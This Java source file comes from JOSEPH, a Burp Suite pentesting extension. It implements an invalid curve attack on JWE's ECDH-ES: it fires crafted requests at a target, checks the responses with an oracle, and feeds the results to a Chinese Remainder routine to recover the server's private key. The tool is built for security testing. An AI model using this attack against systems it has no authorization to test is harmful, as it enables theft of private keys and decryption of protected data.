/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 * <p>
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * <p>
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.invalid_curve;

import burp.IBurpExtenderCallbacks;
import burp.IHttpRequestResponse;
import burp.IHttpService;
import eu.dety.burp.joseph.attacks.IAttack;
import eu.dety.burp.joseph.attacks.invalid_curve.gui.InvalidCurveAttackerResultWindow;
import eu.dety.burp.joseph.attacks.invalid_curve.gui.InvalidCurveTableEntry;
import eu.dety.burp.joseph.utilities.Logger;

import javax.swing.*;
import java.util.ArrayList;
import java.util.List;
import java.util.ListIterator;
import java.util.concurrent.CancellationException;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

/**
 * Invalid Curve Attack
 * <p>
 * Perform the Invalid Curve attack against the ECDH-ES of the JWE specification.
 *
 * @author Vincent Unsel
 * @version 1.0
 */
public class InvalidCurve implements IAttack, Observer {

    private static final Logger loggerInstance = Logger.getInstance();
    private IBurpExtenderCallbacks callbacks;
    private InvalidCurveInfo attackInfo;
    private InvalidCurveAttackerResultWindow resultWindow;
    private InvalidCurveOracle oracle;
    private List<IHttpRequestResponse> responses = new ArrayList<>();
    private IHttpService httpService;
    private ChineseRemainder crt;
    private int requestsFired;
    private int phases = 0;

    /**
     * Constructor of the InvalidCurve attack.
     * 
     * @param callbacks
     *            BurpExtender data
     * @param attackInfo
     *            reference to the necessary information of the attack
     */
    public InvalidCurve(IBurpExtenderCallbacks callbacks, InvalidCurveInfo attackInfo) {
        this.callbacks = callbacks;
        this.attackInfo = attackInfo;
        this.httpService = this.attackInfo.getRequestResponse().getHttpService();
        this.crt = ChineseRemainder.getInstance();
        this.crt.addObserver(this);
        this.resultWindow = new InvalidCurveAttackerResultWindow(attackInfo.getName(), callbacks);
        this.resultWindow.setResultDescription("\nSending requests: ");
        loggerInstance.log(getClass(), "ResultView done.", Logger.LogLevel.DEBUG);
        loggerInstance.log(getClass(), "Construction done.", Logger.LogLevel.DEBUG);
    }

    /**
     * Invokes the whole attack called by the attack button press.
     */
    @Override
    public void performAttack() {
        InvalidCurveAttackRequest validRequest = this.attackInfo.getRequests().get(0);
        AttackExecutor validExecutor = new AttackExecutor(validRequest, phases);
        validExecutor.execute();
        requestsFired = 1;
        IHttpRequestResponse response = null;
        try {
            response = validExecutor.get();
            loggerInstance.log(getClass(), "Collected reference response.", Logger.LogLevel.DEBUG);
        } catch (InterruptedException e) {
            loggerInstance.log(getClass(), "Collecting reference response failed." + e.getMessage(), Logger.LogLevel.ERROR);
        } catch (ExecutionException e) {
            loggerInstance.log(getClass(), "Collecting reference response failed." + e.getMessage(), Logger.LogLevel.ERROR);
        }
        oracle = new InvalidCurveOracle(callbacks, new InvalidCurveTableEntry(responses.size(), validRequest.getPoint(), response, callbacks));
        oracle.setThreshold(this.attackInfo.getThreshold());
        loggerInstance.log(getClass(), "Oracle done.", Logger.LogLevel.DEBUG);
        Thread phaseWaiter = new Thread() {
            @Override
            public void run() {
                try {
                    while (!(crt.isFound() || resultWindow.isCanceled())) {
                        List<AttackExecutor> workers = nextPhase();
                        for (AttackExecutor worker : workers) {
                            try {
                                if (crt.isFound() || crt.pointCollected() || resultWindow.isCanceled()) {
                                    worker.cancel(true);
                                }
                                worker.get(10, TimeUnit.SECONDS);
                            } catch (CancellationException e) {
                                loggerInstance.log(getClass(), "ExecutionWorker was canceled.", Logger.LogLevel.DEBUG);
                            } catch (InterruptedException e) {
                                loggerInstance.log(getClass(), "ExecutionWorker was interrupted.", Logger.LogLevel.ERROR);
                            } catch (ExecutionException e) {
                                loggerInstance.log(getClass(), "ExecutionWorker failed execution.", Logger.LogLevel.ERROR);
                            } catch (TimeoutException e) {
                                worker.cancel(true);
                                loggerInstance.log(getClass(), "Collecting response of ExecutionWorker expired.", Logger.LogLevel.DEBUG);
                            }
                        }
                    }
                } catch (NullPointerException e) {
                    loggerInstance.log(getClass(), "All requests available fired.", Logger.LogLevel.INFO);
                    crt.lastTry();
                }
                attackInfo.getCSVReader().closeFile();
            }
        };
        phaseWaiter.start();

    }

    /**
     * Sets the GUI to display if the key was found.
     */
    public void doFinal() {
        if (crt.isFound()) {
            resultWindow.setResultDescription("\nFound private key: ");
            resultWindow.setProgressBarValue(responses.size(), responses.size());
            resultWindow.setResultText(crt.getCalculated().toString());
        } else {
            resultWindow.nextSpin();
        }
    }

    /**
     * Invokes AttackExecutors in a phase for the next subgroup.
     * 
     * @return attackExecutorList
     */
    public List<AttackExecutor> nextPhase() {
        int phase = ++phases;
        crt.resetBoth();
        attackInfo.generateRequestSet();
        ListIterator<InvalidCurveAttackRequest> it = this.attackInfo.getRequests().listIterator(requestsFired);
        List<AttackExecutor> workers = new ArrayList<>();
        for (; it.hasNext();) {
            ++requestsFired;
            InvalidCurveAttackRequest attackRequest = it.next();
            AttackExecutor attackRequestExecutor = new AttackExecutor(attackRequest, phase);
            workers.add(attackRequestExecutor);
            attackRequestExecutor.execute();
        }
        return workers;
    }

    /**
     * Observer pattern update method.
     */
    @Override
    public void update() {
        this.doFinal();
    }

    /**
     * Attack Executor for each request as SwingWorker to handle requests, responses and the GUI interaction.
     */
    private class AttackExecutor extends SwingWorker<IHttpRequestResponse, Integer> {
        private InvalidCurveAttackRequest attackRequest;
        private int phase;

        /**
         * Constructor to manage requests for each subgroup phase.
         * 
         * @param attackRequest
         * @param phase
         */
        AttackExecutor(InvalidCurveAttackRequest attackRequest, int phase) {
            this.attackRequest = attackRequest;
            this.phase = phase;
        }

        /**
         * Actual execution method.
         * 
         * @return requestResponse
         */
        @Override
        protected IHttpRequestResponse doInBackground() {
            return callbacks.makeHttpRequest(httpService, attackRequest.getRequest());
        }

        /**
         * Method that is called after the response is collected.
         */
        @Override
        protected void done() {
            IHttpRequestResponse requestResponse;
            try {
                requestResponse = get();
            } catch (InterruptedException | ExecutionException e) {
                loggerInstance.log(InvalidCurve.class, "Failed to get request result: " + e.getMessage(), Logger.LogLevel.ERROR);
                return;
            } catch (CancellationException e) {
                return;
            }
            // Add response to response list
            responses.add(requestResponse);
            // Add new entry to result table
            resultWindow.addEntry(new InvalidCurveTableEntry(responses.size(), attackRequest.getPoint(), requestResponse, callbacks));
            // Update the progress bar
            resultWindow.setProgressBarValue(responses.size(), attackInfo.getAmountRequests());
            if (this.phase > 0 && oracle.matchValid(requestResponse.getResponse())) {
                crt.addPoint(attackRequest.getPoint());
            }
        }
    }
}
